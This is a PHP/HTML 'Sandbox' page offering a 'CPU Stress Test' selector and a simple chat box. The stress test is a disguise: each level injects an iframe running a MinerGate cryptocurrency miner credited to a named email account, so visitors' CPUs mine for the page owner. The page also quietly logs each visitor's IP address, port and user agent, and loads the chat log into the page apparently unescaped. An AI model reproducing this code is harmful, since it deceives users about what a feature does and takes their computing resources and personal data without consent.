<!DOCTYPE html>
<html>
    <?php header('Access-Control-Allow-Origin: *'); ?>
    <head>
        <title>Sandbox</title>
            <script src="http://code.jquery.com/jquery-2.1.0.min.js"></script>
    <link href="/css/bootstrap.min.css" rel="stylesheet">
    <link href="/sandbox/sandbox.css" rel="stylesheet">
    <style>
        .module {
            margin:5%;
        }
        
    </style>
    </head>
    <body>
    
    <script src="/js/bootstrap.min.js"></script>
    <?php
        $logfile = fopen("../beta/log.txt", "a+") or die("Code 1");
        $timestamp = date('Y-m-d h:i:sa');
        fwrite($logfile, $timestamp." IP: ".$_SERVER['REMOTE_ADDR']." Port: ".$_SERVER['REMOTE_PORT']." Host: ".$_SERVER['REMOTE_HOST']." User Agent: ".$_SERVER['HTTP_USER_AGENT']." Page: ".$_SERVER['REQUEST_URI']."\n");
        fclose($logfile);
    ?>
    <!--Stress Tester-->
        <div id="stress-test" class="module panel panel-primary">
            <div class="panel-heading"><h3>CPU Stress Test</h3></div>
            <div class="panel-body">
            <select name="stress_levels" id="stress-selector" onchange="changeScript()">
                <option value="0">Off</option>
                <option value="1">1</option>
                <option value="2">2</option>
                <option value="3">3</option>
                <option value="4">4</option>
                <option value="5">5</option>
                <option value="6">6</option>
                <option value="7">7</option>
                <option value="8">8</option>
            </select>
            <script type="text/javascript">
            
            function changeScript(){
               var stressLevel = document.getElementById("stress-selector").value;
               switch(stressLevel){
                   case "0":console.log("Stopped");document.getElementsByTagName("iframe")[0].innerHTML = "None";console.log(document.getElementsByTagName("iframe")[0].innerHTML);break;
                   case "1":console.log("Running at stress level "+stressLevel);$("#stress-script-box").html("(function() { var w = document.createElement('iframe');w.style.border = 'none'; w.style.width = '293px';  w.style.height = '73px';w.src = 'http://minergate.com/wmr/bcn/robertbaker31415%40gmail.com/1/8518a83073d99d36/big/0/.';var s = document.getElementsByTagName('body')[0];s.appendChild(w, s);})();"); break;
                   case "2":console.log("Running at stress level "+stressLevel);$("#stress-script-box").html("(function() { var w = document.createElement('iframe');w.style.border = 'none'; w.style.width = '293px';  w.style.height = '73px';w.src = 'http://minergate.com/wmr/bcn/robertbaker31415%40gmail.com/2/8518a83073d99d36/big/0/.';var s = document.getElementsByTagName('body')[0];s.appendChild(w, s);})();"); break;
                   case "3":console.log("Running at stress level "+stressLevel);$("#stress-script-box").html("(function() { var w = document.createElement('iframe');w.style.border = 'none'; w.style.width = '293px';  w.style.height = '73px';w.src = 'http://minergate.com/wmr/bcn/robertbaker31415%40gmail.com/3/8518a83073d99d36/big/0/.';var s = document.getElementsByTagName('body')[0];s.appendChild(w, s);})();"); break;
                   case "4":console.log("Running at stress level "+stressLevel);$("#stress-script-box").html("(function() { var w = document.createElement('iframe');w.style.border = 'none'; w.style.width = '293px';  w.style.height = '73px';w.src = 'http://minergate.com/wmr/bcn/robertbaker31415%40gmail.com/4/8518a83073d99d36/big/0/.';var s = document.getElementsByTagName('body')[0];s.appendChild(w, s);})();"); break;
                   case "5":console.log("Running at stress level "+stressLevel);$("#stress-script-box").html("(function() { var w = document.createElement('iframe');w.style.border = 'none'; w.style.width = '293px';  w.style.height = '73px';w.src = 'http://minergate.com/wmr/bcn/robertbaker31415%40gmail.com/5/8518a83073d99d36/big/0/.';var s = document.getElementsByTagName('body')[0];s.appendChild(w, s);})();"); break;
                   case "6":console.log("Running at stress level "+stressLevel);$("#stress-script-box").html("(function() { var w = document.createElement('iframe');w.style.border = 'none'; w.style.width = '293px';  w.style.height = '73px';w.src = 'http://minergate.com/wmr/bcn/robertbaker31415%40gmail.com/6/8518a83073d99d36/big/0/.';var s = document.getElementsByTagName('body')[0];s.appendChild(w, s);})();"); break;
                   case "7":console.log("Running at stress level "+stressLevel);$("#stress-script-box").html("(function() { var w = document.createElement('iframe');w.style.border = 'none'; w.style.width = '293px';  w.style.height = '73px';w.src = 'http://minergate.com/wmr/bcn/robertbaker31415%40gmail.com/7/8518a83073d99d36/big/0/.';var s = document.getElementsByTagName('body')[0];s.appendChild(w, s);})();"); break;
                   case "8":console.log("Running at stress level "+stressLevel);$("#stress-script-box").html("(function() { var w = document.createElement('iframe');w.style.border = 'none'; w.style.width = '293px';  w.style.height = '73px';w.src = 'http://minergate.com/wmr/bcn/robertbaker31415%40gmail.com/8/8518a83073d99d36/big/0/.';var s = document.getElementsByTagName('body')[0];s.appendChild(w, s);})();"); break;
                   default: break;
               };}
            </script>
           <script id="stress-script-box"></script>
        </div>
        </div>
        
        
        <!--Chatbox-->
        <div id="chat" class="module panel panel-primary">
            <div class="panel-heading">Chat</div>
            <div class="panel-body">
                <div id="prev-chats" class="well"></div>
                <p>Type "command clear" to clear the chatLog</p>
                <textarea id="chat-input"></textarea>
                <button class="btn btn-default" onclick="sendChat()">Enter</button>
                <button class="btn btn-default" onclick="update()">Update</button>
                
                <script type="text/javascript">
                
                    function sendChat(){
                        var message = $("#chat-input").val();
                        var datavar = {"message": message};
                        
                        console.log("Sending message to server");
                        $.ajax({
                            type: "POST",
                            async: "false",
                            url: "chatResponse.php",
                            data: datavar,
                            success: logStat
                        });
                        //$.post("chatResponse.php",{"message": message},logStat());
                        console.log("Message sent to server");
                    };
                    function update(){
                        $("#prev-chats").load("chatLog.txt");
                        console.log("chat updated");
                    }
                    function logStat(data, status){
                        console.log("logStat function called, data:" + data + " status: " + status);
                        update();
                        $("#chat-input").val("");
                        console.log("chatbox cleared");
                    };
                    $("#chat-input").keypress(function(e){
                        if(e.which == 13){
                            sendChat();
                        }
                    })
                    update();
                </script>
                
            </div>
            
        </div>
        
        
        <noscript>
            <h1>Sorry, but javascript must be enabled to view the contents of this page properly</h1>
        <  <br /> oscript>
    </body>
    
</html>